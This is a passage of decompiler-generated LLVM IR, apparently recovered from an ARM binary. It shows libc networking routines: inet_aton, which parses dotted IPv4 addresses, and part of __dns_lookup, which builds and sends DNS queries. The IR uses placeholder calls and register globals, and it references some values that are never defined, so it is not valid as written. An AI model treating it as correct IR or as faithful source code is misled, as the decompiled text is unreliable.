dec_label_pc_15214:                               ; preds = %dec_label_pc_15204
  %v1_15214 = add i32 %v0_15214, 1
  %v1_15218 = inttoptr i32 %v1_15214 to i8*
  %v2_15218 = load i8, i8* %v1_15218, align 1
  %v3_15218 = zext i8 %v2_15218 to i32
  %v2_1521c = icmp eq i8 %v2_15218, 0
  br i1 %v2_1521c, label %dec_label_pc_15218._crit_edge, label %bb

dec_label_pc_15218._crit_edge:                    ; preds = %dec_label_pc_15214, %entry
  %v3_15218.lcssa = phi i32 [ %v3_152184, %entry ], [ %v3_15218, %dec_label_pc_15214 ]
  ret i32 %v3_15218.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_15214
  %v0_15214 = phi i32 [ %v0_151f4, %.lr.ph ], [ %v1_15214, %dec_label_pc_15214 ]
  %v3_152186 = phi i32 [ %v3_152184, %.lr.ph ], [ %v3_15218, %dec_label_pc_15214 ]
  br label %dec_label_pc_15204

dec_label_pc_1522c:                               ; preds = %dec_label_pc_151fc
  ret i32 %v0_15214

; uselistorder directives
  uselistorder i32 %v3_15218, { 1, 0 }
  uselistorder i32 %v3_15204, { 1, 0 }
  uselistorder i32 %v0_1520c, { 1, 0 }
  uselistorder i32 %v3_152184, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_15204, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_15234 = load i32, i32* %r0.global-to-local, align 4
  %v2_15234 = icmp eq i32 %v0_15234, 0
  %v3_15238 = load i32, i32* @r4, align 4
  store i32 %v3_15238, i32* %stack_var_-20, align 4
  br i1 %v2_15234, label %dec_label_pc_15314, label %dec_label_pc_15250.lr.ph

dec_label_pc_15250:                               ; preds = %dec_label_pc_15250.lr.ph, %dec_label_pc_152d4
  %v1_152d4 = phi i32 [ 0, %dec_label_pc_15250.lr.ph ], [ %v5_152d4, %dec_label_pc_152d4 ]
  %v0_152d8 = phi i32 [ 1, %dec_label_pc_15250.lr.ph ], [ %v1_152d8, %dec_label_pc_152d4 ]
  %v0_15258 = phi i32 [ %v0_15234, %dec_label_pc_15250.lr.ph ], [ %v0_1525825, %dec_label_pc_152d4 ]
  store i32 %v2_15254.pre, i32* @lr, align 4
  %v1_15258 = inttoptr i32 %v0_15258 to i8*
  %v2_15258 = load i8, i8* %v1_15258, align 1
  %v3_15258 = zext i8 %v2_15258 to i32
  %v3_1525c = mul nuw nsw i32 %v3_15258, 2
  %v4_1525c = add i32 %v3_1525c, %v2_15254.pre
  %v5_1525c = inttoptr i32 %v4_1525c to i8*
  %v6_1525c = load i8, i8* %v5_1525c, align 1
  %v1_15260 = and i8 %v6_1525c, 8
  %v2_15260 = icmp eq i8 %v1_15260, 0
  br i1 %v2_15260, label %dec_label_pc_15314, label %dec_label_pc_15268

dec_label_pc_15268:                               ; preds = %dec_label_pc_15250
  br label %dec_label_pc_15288

dec_label_pc_15270:                               ; preds = %dec_label_pc_15288
  %v3_15274 = mul i32 %v0_152d4, 10
  %v4_15274 = add i32 %v3_15288, %v3_15274
  %v1_15278 = add i32 %v4_15274, -48
  %v8_15280 = icmp sgt i32 %v1_15278, 255
  br i1 %v8_15280, label %dec_label_pc_15314, label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_15270
  %v1_15284 = add i32 %v0_152c4, 1
  store i32 %v1_15284, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15288

dec_label_pc_15288:                               ; preds = %dec_label_pc_15268, %dec_label_pc_15284
  %v0_152d4 = phi i32 [ 0, %dec_label_pc_15268 ], [ %v1_15278, %dec_label_pc_15284 ]
  %v0_152c4 = phi i32 [ %v0_15258, %dec_label_pc_15268 ], [ %v1_15284, %dec_label_pc_15284 ]
  %v1_15288 = inttoptr i32 %v0_152c4 to i8*
  %v2_15288 = load i8, i8* %v1_15288, align 1
  %v3_15288 = zext i8 %v2_15288 to i32
  store i32 %v3_15288, i32* @ip, align 4
  %v2_1528c = mul nuw nsw i32 %v3_15288, 2
  %v2_15290 = add i32 %v2_1528c, %v2_15254.pre
  %v3_15294 = inttoptr i32 %v2_15290 to i8*
  %v4_15294 = load i8, i8* %v3_15294, align 1
  %v6_15294 = zext i8 %v4_15294 to i32
  %v1_152a0 = and i32 %v6_15294, 8
  %v2_152a0 = icmp eq i32 %v1_152a0, 0
  br i1 %v2_152a0, label %dec_label_pc_152a8, label %dec_label_pc_15270

dec_label_pc_152a8:                               ; preds = %dec_label_pc_15288
  %v8_152ac = icmp sgt i32 %v0_152d8, 3
  br i1 %v8_152ac, label %dec_label_pc_152c0, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_152a8
  %v7_152b0 = icmp eq i8 %v2_15288, 46
  br i1 %v7_152b0, label %dec_label_pc_152b8, label %dec_label_pc_15314

dec_label_pc_152b8:                               ; preds = %dec_label_pc_152b0
  %v1_152b8 = add i32 %v0_152c4, 1
  store i32 %v1_152b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152d4

dec_label_pc_152c0:                               ; preds = %dec_label_pc_152a8
  %v2_152c0 = icmp eq i8 %v2_15288, 0
  %v1_152c4 = add i32 %v0_152c4, 1
  store i32 %v1_152c4, i32* %r0.global-to-local, align 4
  br i1 %v2_152c0, label %dec_label_pc_152d4, label %dec_label_pc_152cc

dec_label_pc_152cc:                               ; preds = %dec_label_pc_152c0
  %v1_152cc = and i32 %v6_15294, 32
  %v2_152cc = icmp eq i32 %v1_152cc, 0
  br i1 %v2_152cc, label %dec_label_pc_15314, label %dec_label_pc_152d4

dec_label_pc_152d4:                               ; preds = %dec_label_pc_152cc, %dec_label_pc_152c0, %dec_label_pc_152b8
  %v0_1525825 = phi i32 [ %v1_152c4, %dec_label_pc_152cc ], [ %v1_152c4, %dec_label_pc_152c0 ], [ %v1_152b8, %dec_label_pc_152b8 ]
  %v4_152d4 = mul i32 %v1_152d4, 256
  %v5_152d4 = or i32 %v0_152d4, %v4_152d4
  %v1_152d8 = add nuw nsw i32 %v0_152d8, 1
  %v7_152e0 = icmp slt i32 %v1_152d8, 5
  br i1 %v7_152e0, label %dec_label_pc_15250, label %dec_label_pc_152e4

dec_label_pc_15250.lr.ph:                         ; preds = %entry
  %v2_15254.pre = load i32, i32* @global_var_23df4, align 4
  br label %dec_label_pc_15250

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152d4
  %v2_152e4 = icmp eq i32 %arg2, 0
  br i1 %v2_152e4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_152e4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_152e4
  %v3_15300 = call i32 @llvm.bswap.i32(i32 %v5_152d4)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_1530c = inttoptr i32 %arg2 to i32*
  store i32 %v3_15300, i32* %v3_1530c, align 4
  %v2_15310.pre = load i32, i32* %stack_var_-20, align 4
  %v17_15310.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_15310 = phi i32 [ 1, %bb ], [ %v17_15310.pre, %bb41 ]
  %v2_15310 = phi i32 [ %v3_15238, %bb ], [ %v2_15310.pre, %bb41 ]
  store i32 %v2_15310, i32* @r4, align 4
  ret i32 %v17_15310

dec_label_pc_15314:                               ; preds = %dec_label_pc_152b0, %dec_label_pc_152cc, %dec_label_pc_15250, %dec_label_pc_15270, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_15238, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_15254.pre, { 2, 1, 0 }
  uselistorder i32 %v1_152d8, { 1, 0 }
  uselistorder i32 %v3_15288, { 0, 2, 1 }
  uselistorder i32 %v0_152c4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_15238, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_15314, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_15288, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_15320 = load i32, i32* @r4, align 4
  %v6_15320 = load i32, i32* @r5, align 4
  %v9_15320 = load i32, i32* @r6, align 4
  %v12_15320 = load i32, i32* @r7, align 4
  %v15_15320 = load i32, i32* @r8, align 4
  %v18_15320 = load i32, i32* @sb, align 4
  %v21_15320 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_15340 = call i32 @malloc(i32 512)
  store i32 %v1_15340, i32* @r7, align 4
  %v1_1534c = call i32 @malloc(i32 1025)
  %v2_15350 = icmp eq i32 %v1_1534c, 0
  br i1 %v2_15350, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_15354 = load i32, i32* @r7, align 4
  %v3_15354 = icmp eq i32 %v1_15354, 0
  store i32 %v1_1534c, i32* %stack_var_-236, align 4
  br i1 %v3_15354, label %bb195, label %dec_label_pc_15368

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15a48

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_15a48

dec_label_pc_15368:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_1536c = icmp eq i32 %arg3, 0
  br i1 %v2_1536c, label %dec_label_pc_15a48, label %dec_label_pc_15374

dec_label_pc_15374:                               ; preds = %dec_label_pc_15368
  %v2_15378 = load i8, i8* %arg1, align 1
  %v2_1537c = icmp eq i8 %v2_15378, 0
  br i1 %v2_1537c, label %dec_label_pc_15a48, label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15374
  %v3_15388 = call i32 @strlen(i8* nonnull %arg1)
  %v2_15390 = add i32 %v3_15388, %tmp
  %v1_15394 = add i32 %v2_15390, -1
  %v2_15394 = inttoptr i32 %v1_15394 to i8*
  %v3_15394 = load i8, i8* %v2_15394, align 1
  %v2_15398 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_15398, i32* @r4, align 4
  %v7_1539c = icmp eq i8 %v3_15394, 46
  %. = zext i1 %v7_1539c to i32
  store i32 %v2_15398, i32* @r0, align 4
  %v1_153c0 = call i32 @__pthread_return_void()
  %v1_153d0 = call i32 @__pthread_return_0()
  %v2_153dc = load i32, i32* @global_var_2a3e8.870, align 4
  %v2_153e0 = srem i32 %v2_153dc, %arg3
  %v3_153e8 = load i8, i8* @global_var_24135.873, align 1
  %v4_153e8 = zext i8 %v3_153e8 to i32
  %v2_153ec = load i8, i8* bitcast (i8** @global_var_24134.872 to i8*), align 4
  %v3_153ec = zext i8 %v2_153ec to i32
  %v4_153f4 = mul nuw nsw i32 %v4_153e8, 256
  %v5_153f4 = or i32 %v3_153ec, %v4_153f4
  store i32 %v5_153f4, i32* @sb, align 4
  store i32 %v2_153e0, i32* @sl, align 4
  store i32 %v2_15398, i32* @r0, align 4
  %v1_15408 = call i32 @__pthread_return_void()
  %v0_15414 = load i32, i32* @r5, align 4
  %v2_15434 = ptrtoint i8* %stack_var_-188 to i32
  %v6_15478 = bitcast i8* %stack_var_-188 to i32*
  %v2_15558 = ptrtoint i32* %stack_var_-92 to i32
  %v3_155f0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_15654 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_159a0 = icmp eq i1 %v7_1539c, false
  %v7_156a8 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1578c = ptrtoint i32* %stack_var_-140 to i32
  %v9_15884 = icmp eq i32 %tmp147, %arg2
  %v7_15818 = icmp eq i32 %arg2, 1
  %v2_157c0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_15414, 3
  br i1 %tmp292, label %dec_label_pc_1541c.lr.ph.preheader.lr.ph, label %dec_label_pc_15a54

dec_label_pc_1541c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_15384
  %v2_1572c = icmp eq i32 %tmp156, 0
  %v8_1581c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_1541c.lr.ph.preheader

dec_label_pc_1541c:                               ; preds = %dec_label_pc_1541c.lr.ph, %dec_label_pc_15a38.backedge
  %v1_15424 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_1541c.lr.ph ], [ %v0_155cc, %dec_label_pc_15a38.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_1541c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_15a38.backedge ]
  %v7_15420 = icmp eq i32 %v1_15424, -1
  br i1 %v7_15420, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_1541c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_1541c, %bb199
  %v1_15428 = xor i1 %v7_15420, true
  call void @__pseudo_cond_branch(i1 %v1_15428, i32 ptrtoint (i32* @global_var_f6d8.875 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_15434, i32* @r4, align 4
  %v0_15438 = load i32, i32* @r7, align 4
  %v2_1543c = inttoptr i32 %v0_15438 to i8*
  %v3_1543c = call i32 @__GI_memset(i8* %v2_1543c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_1544c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_15450 = load i32, i32* @sb, align 4
  %v1_15450 = add i32 %v0_15450, 1
  %v3_15458 = urem i32 %v1_15450, 65536
  store i32 %v3_15458, i32* @sb, align 4
  %v0_15464 = load i32, i32* @r7, align 4
  %v5_15470 = trunc i32 %v1_15450 to i8
  store i8 %v5_15470, i8* %stack_var_-188, align 1
  %v7_15478 = call i32 @__encode_header(i32* %v6_15478, i32 %v0_15464, i32 512, i32 1, i32 %v1_15450)
  store i32 %v7_15478, i32* @r5, align 4
  %v1_1547c = icmp slt i32 %v7_15478, 0
  br i1 %v1_1547c, label %dec_label_pc_15a54, label %dec_label_pc_15484

dec_label_pc_15484:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_1548c = load i32, i32* %stack_var_-236, align 4
  %v4_15490 = call i32 @strncpy(i32 %v2_1548c, i32 %tmp, i32 1025)
  store i32 %v2_15398, i32* @r0, align 4
  %v1_154a8 = call i32 @__pthread_return_void()
  %v1_154b8 = call i32 @__pthread_return_0()
  %v1_154c8 = load i32, i32* @sl, align 4
  %v4_154c8 = mul i32 %v1_154c8, 4
  %v5_154c8 = add i32 %v4_154c8, %arg4
  %v6_154c8 = inttoptr i32 %v5_154c8 to i32*
  %v7_154c8 = load i32, i32* %v6_154c8, align 4
  store i32 %v7_154c8, i32* @r6, align 4
  br i1 %v1_154c4, label %dec_label_pc_1550c, label %dec_label_pc_154d0

dec_label_pc_154d0:                               ; preds = %dec_label_pc_15484
  %v2_154d8 = load i32, i32* @global_var_2a4b8.878, align 4
  %v6_154e0 = icmp slt i32 %v6_159fc, %v2_154d8
  br i1 %v6_154e0, label %dec_label_pc_154e4, label %dec_label_pc_1550c

dec_label_pc_154e4:                               ; preds = %dec_label_pc_154d0
  store i32 ptrtoint (i32* @global_var_1afe8.880 to i32), i32* @r1, align 4
  %v2_154ec = load i32, i32* %stack_var_-236, align 4
  %v4_154f0 = inttoptr i32 %v2_154ec to i8*
  %v5_154f0 = call i32 @__GI_strncat(i8* %v4_154f0, i32 ptrtoint (i32* @global_var_1afe8.880 to i32), i32 1025, i32 %v2_154d8)
  %v7_15500 = load i32, i32* %v6_15500, align 4
  store i32 %v7_15500, i32* @r1, align 4
  %v4_15508 = inttoptr i32 %v2_154ec to i8*
  %v5_15508 = call i32 @__GI_strncat(i8* %v4_15508, i32 %v7_15500, i32 1025, i32 ptrtoint (i32* @global_var_2a498.882 to i32))
  br label %dec_label_pc_1550c

dec_label_pc_1550c:                               ; preds = %dec_label_pc_154d0, %dec_label_pc_15484, %dec_label_pc_154e4
  store i32 %v2_15398, i32* @r0, align 4
  store i32 87328, i32* @lr, align 4
  %v1_1551c = call i32 @__pthread_return_void()
  %v2_15528 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_15528, i32* %stack_var_-56, align 4
  %v0_15538 = load i32, i32* @r7, align 4
  %v1_15538 = load i32, i32* @r5, align 4
  %v2_15538 = add i32 %v1_15538, %v0_15538
  %v1_1553c = sub i32 512, %v1_15538
  %v8_15544 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_15538, i32 %v1_1553c, i32 %arg2, i32 %v2_15528, i32 %arg2, i32 1)
  store i32 %v8_15544, i32* @fp, align 4
  %v1_15548 = icmp slt i32 %v8_15544, 0
  br i1 %v1_15548, label %dec_label_pc_15a54, label %dec_label_pc_15550

dec_label_pc_15550:                               ; preds = %dec_label_pc_1550c
  store i32 0, i32* @r4, align 4
  %v0_15560 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_1556c = inttoptr i32 %v0_15560 to i8*
  %v4_1556c = call i32 @inet_pton(i32 10, i8* %v3_1556c, i32 %v2_15558)
  %v1_15570 = load i32, i32* @r4, align 4
  %v7_15574 = icmp sgt i32 %v4_1556c, %v1_15570
  br i1 %v7_15574, label %bb201, label %dec_label_pc_15550..thread11_crit_edge

dec_label_pc_15550..thread11_crit_edge:           ; preds = %dec_label_pc_15550
  %v3_15580.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_15550
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_15550..thread11_crit_edge, %bb201
  %v3_15580 = phi i8 [ %v3_15580.pre, %dec_label_pc_15550..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_15580 = sext i8 %v3_15580 to i32
  %v8_1557c.op = urem i32 %v1_15570, 256
  %v8_1557c.op.op = mul nuw nsw i32 %v8_1557c.op, 256
  %v4_15588 = select i1 %v7_15574, i32 %v8_1557c.op.op, i32 0
  %v5_15588 = or i32 %v4_15580, %v4_15588
  %v7_1558c = icmp eq i32 %v5_15588, 10
  br i1 %v7_1558c, label %dec_label_pc_155b8, label %dec_label_pc_155a0

dec_label_pc_155a0:                               ; preds = %.thread11
  %v0_155a4 = load i32, i32* @r6, align 4
  store i32 %v0_155a4, i32* @r0, align 4
  %v1_155b0 = call i32 @inet_addr(i32 %v0_155a4)
  br label %dec_label_pc_155b8

dec_label_pc_155b8:                               ; preds = %.thread11, %dec_label_pc_155a0
  %v0_155cc = call i32 @socket()
  %v1_155d0 = icmp slt i32 %v0_155cc, 0
  br i1 %v1_155d0, label %.thread, label %dec_label_pc_155e8

.thread:                                          ; preds = %dec_label_pc_155b8
  br label %dec_label_pc_15a38.backedge

dec_label_pc_15a38.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_1541c, label %dec_label_pc_15a54

dec_label_pc_155e8:                               ; preds = %dec_label_pc_155b8
  %v4_155f0 = call i32 @__libc_connect(i32 %v0_155cc, %sockaddr* nonnull %v3_155f0, i32 28)
  %v1_155f4 = icmp slt i32 %v4_155f0, 0
  br i1 %v1_155f4, label %dec_label_pc_155fc, label %dec_label_pc_1561c

dec_label_pc_155fc:                               ; preds = %dec_label_pc_155e8
  %v0_155fc = call i32 @__errno_location()
  %v1_15600 = inttoptr i32 %v0_155fc to i32*
  %v2_15600 = load i32, i32* %v1_15600, align 4
  %v7_15604 = icmp eq i32 %v2_15600, 101
  br i1 %v7_15604, label %dec_label_pc_15968, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_155fc
  br label %dec_label_pc_15a38.backedge

dec_label_pc_1561c:                               ; preds = %dec_label_pc_155e8
  %v0_1561c = load i32, i32* @r5, align 4
  %v1_1561c = load i32, i32* @fp, align 4
  %v2_1561c = add i32 %v1_1561c, %v0_1561c
  %v0_15620 = load i32, i32* @r7, align 4
  %v4_1562c = inttoptr i32 %v0_15620 to i32*
  %v5_1562c = call i32 @__libc_send(i32 %v0_155cc, i32* %v4_1562c, i32 %v2_1561c, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_155cc, i32* %stack_var_-44, align 4
  %v11_15654 = call i32 @__libc_poll(%pollfd* %v10_15654, i32 1, i32 10000, i32 1, i32 %v0_155cc, i32 1, i32 0)
  %v1_15658 = load i32, i32* @r4, align 4
  %v7_1565c = icmp sgt i32 %v11_15654, %v1_15658
  br i1 %v7_1565c, label %dec_label_pc_15660, label %dec_label_pc_15968

dec_label_pc_15660:                               ; preds = %dec_label_pc_1561c
  %v0_15668 = load i32, i32* @r7, align 4
  %v5_15670 = inttoptr i32 %v0_15668 to i32*
  %v6_15670 = call i32 @__libc_recv(i32 %v0_155cc, i32* %v5_15670, i32 512, i32 %v1_15658, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_15670, i32* @fp, align 4
  %v7_1567c = icmp slt i32 %v6_15670, 12
  br i1 %v7_1567c, label %dec_label_pc_1599c, label %dec_label_pc_15680

dec_label_pc_15680:                               ; preds = %dec_label_pc_15660
  %v0_15680 = load i32, i32* @r7, align 4
  %v2_15688 = inttoptr i32 %v0_15680 to i8*
  %v3_15688 = call i32 @__decode_header(i8* %v2_15688, i32 %v2_15434)
  %v3_1568c = load i8, i8* %stack_var_-188, align 1
  %v4_1568c = sext i8 %v3_1568c to i32
  store i32 %v4_1568c, i32* @r6, align 4
  %v1_15690 = load i32, i32* @sb, align 4
  %v9_15690 = icmp eq i32 %v4_1568c, %v1_15690
  br i1 %v9_15690, label %dec_label_pc_15698, label %dec_label_pc_1599c

dec_label_pc_15698:                               ; preds = %dec_label_pc_15680
  %v1_1569c = load i32, i32* @r4, align 4
  %v9_1569c = icmp eq i32 %tmp157, %v1_1569c
  br i1 %v9_1569c, label %dec_label_pc_1599c, label %dec_label_pc_156a4

dec_label_pc_156a4:                               ; preds = %dec_label_pc_15698
  br i1 %v7_156a8, label %dec_label_pc_156b0, label %dec_label_pc_1572c

dec_label_pc_156b0:                               ; preds = %dec_label_pc_156a4
  %v9_156b4 = icmp eq i32 %., %v1_1569c
  br i1 %v9_156b4, label %dec_label_pc_156bc, label %dec_label_pc_15720

dec_label_pc_156bc:                               ; preds = %dec_label_pc_156b0
  store i32 %v2_15398, i32* @r5, align 4
  store i32 %v2_15398, i32* @r0, align 4
  %v1_156d4 = call i32 @__pthread_return_void()
  %v1_156e4 = call i32 @__pthread_return_0()
  store i32 %v2_15398, i32* @r0, align 4
  %v2_156f0 = load i32, i32* @global_var_2a4b8.878, align 4
  %v1_15700 = call i32 @__pthread_return_void()
  %v1_15708 = add i32 %v2_156f0, -1
  store i32 %v1_15708, i32* @r4, align 4
  %v5_15710 = icmp slt i32 %v6_159fc, %v1_15708
  br i1 %v5_15710, label %.thread19, label %dec_label_pc_15720

.thread19:                                        ; preds = %dec_label_pc_156bc
  %v7_15710 = add i32 %v6_159fc, 1
  %v6_15714 = load i32, i32* @r6, align 4
  store i32 %v6_15714, i32* @sb, align 4
  br label %dec_label_pc_15a38.outer.backedge

dec_label_pc_15720:                               ; preds = %dec_label_pc_156bc, %dec_label_pc_156b0
  %v0_15720 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15750

dec_label_pc_1572c:                               ; preds = %dec_label_pc_156a4
  br i1 %v2_1572c, label %dec_label_pc_15734, label %dec_label_pc_1599c

dec_label_pc_15734:                               ; preds = %dec_label_pc_1572c
  br i1 %tmp198, label %dec_label_pc_15748, label %dec_label_pc_15760.preheader

dec_label_pc_15760.preheader:                     ; preds = %dec_label_pc_15734
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_15760

dec_label_pc_15748:                               ; preds = %dec_label_pc_15734
  %v0_15748 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_15750

dec_label_pc_15750:                               ; preds = %dec_label_pc_15720, %dec_label_pc_15748
  %storemerge4 = phi i32 [ %v0_15748, %dec_label_pc_15748 ], [ %v0_15720, %dec_label_pc_15720 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_15748 ], [ 1, %dec_label_pc_15720 ]
  %v2_15750 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_15750, align 4
  br label %dec_label_pc_15a64

dec_label_pc_15758:                               ; preds = %dec_label_pc_15760
  %v2_15758 = call i32 @__length_question(i32 %v0_1576c, i32 %v0_15768)
  %v0_1575c = load i32, i32* @r5, align 4
  %v2_1575c = add i32 %v0_1575c, %v2_15758
  store i32 %v2_1575c, i32* @r5, align 4
  %v0_15764.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15760

dec_label_pc_15760:                               ; preds = %dec_label_pc_15760.preheader, %dec_label_pc_15758
  %v0_15768 = phi i32 [ 12, %dec_label_pc_15760.preheader ], [ %v2_1575c, %dec_label_pc_15758 ]
  %v0_15770 = phi i32 [ 0, %dec_label_pc_15760.preheader ], [ %v0_15764.pre, %dec_label_pc_15758 ]
  store i32 %v0_15768, i32* @r1, align 4
  %v0_1576c = load i32, i32* @r7, align 4
  store i32 %v0_1576c, i32* @r0, align 4
  %v1_15770 = add i32 %v0_15770, 1
  store i32 %v1_15770, i32* @r4, align 4
  %v5_15774 = icmp slt i32 %v0_15770, 1
  br i1 %v5_15774, label %dec_label_pc_15758, label %dec_label_pc_15778

dec_label_pc_15778:                               ; preds = %dec_label_pc_15760
  br label %dec_label_pc_158d4

dec_label_pc_1578c:                               ; preds = %bb205
  store i32 %v2_1578c, i32* @r4, align 4
  %v0_15790 = load i32, i32* @r7, align 4
  %v0_15798 = load i32, i32* @fp, align 4
  %v5_157a0 = call i32 @__decode_answer(i32 %v0_15790, i32 %v0_15794, i32 %v0_15798, i32* nonnull %stack_var_-140)
  %v1_157a4 = icmp slt i32 %v5_157a0, 0
  br i1 %v1_157a4, label %dec_label_pc_157b0, label %dec_label_pc_157cc

dec_label_pc_157b0:                               ; preds = %dec_label_pc_1578c
  %v2_157b4 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_157b4, label %dec_label_pc_1599c, label %dec_label_pc_157bc

dec_label_pc_157bc:                               ; preds = %dec_label_pc_157b0
  br i1 %v2_157c0, label %dec_label_pc_1599c, label %dec_label_pc_158e8

dec_label_pc_157cc:                               ; preds = %dec_label_pc_1578c
  %v2_157d0 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_157d0, label %dec_label_pc_15874, label %dec_label_pc_157d8

dec_label_pc_157d8:                               ; preds = %dec_label_pc_157cc
  %v0_157d8 = load i32, i32* @r8, align 4
  %v3_157dc = add i32 %v0_157d8, 32
  %v4_157dc = inttoptr i32 %v3_157dc to i32*
  %v5_157dc = load i32, i32* %v4_157dc, align 4
  store i32 %v5_157dc, i32* @ip, align 4
  %v6_157dc = add i32 %v0_157d8, 36
  %v7_157dc = inttoptr i32 %v6_157dc to i32*
  %v8_157dc = load i32, i32* %v7_157dc, align 4
  store i32 %v8_157dc, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1578c, i32* @r1, align 4
  store i32 %v0_157d8, i32* @r0, align 4
  %v0_157f8 = call i32 @memcpy()
  %v0_157fc = load i32, i32* @r8, align 4
  %v1_157fc = add i32 %v0_157fc, 4
  %v2_157fc = inttoptr i32 %v1_157fc to i32*
  %v3_157fc = load i32, i32* %v2_157fc, align 4
  %v7_15800 = icmp eq i32 %v3_157fc, 24
  br i1 %v7_15800, label %dec_label_pc_15824, label %dec_label_pc_15808

dec_label_pc_15808:                               ; preds = %dec_label_pc_157d8
  %v1_15808 = add i32 %v0_157fc, 28
  %v2_15808 = inttoptr i32 %v1_15808 to i32*
  %v3_15808 = load i32, i32* %v2_15808, align 4
  %v2_1580c = icmp eq i32 %v3_15808, 0
  br i1 %v2_1580c, label %dec_label_pc_158e8, label %dec_label_pc_15814

dec_label_pc_15814:                               ; preds = %dec_label_pc_15808
  br i1 %v7_15818, label %dec_label_pc_15824, label %bb203

bb203:                                            ; preds = %dec_label_pc_15814
  br i1 %v8_1581c, label %dec_label_pc_15824, label %dec_label_pc_158e8

dec_label_pc_15824:                               ; preds = %dec_label_pc_15814, %bb203, %dec_label_pc_157d8
  %v9_15828 = icmp eq i32 %v3_157fc, %arg2
  br i1 %v9_15828, label %dec_label_pc_1583c, label %dec_label_pc_15830

dec_label_pc_15830:                               ; preds = %dec_label_pc_15824
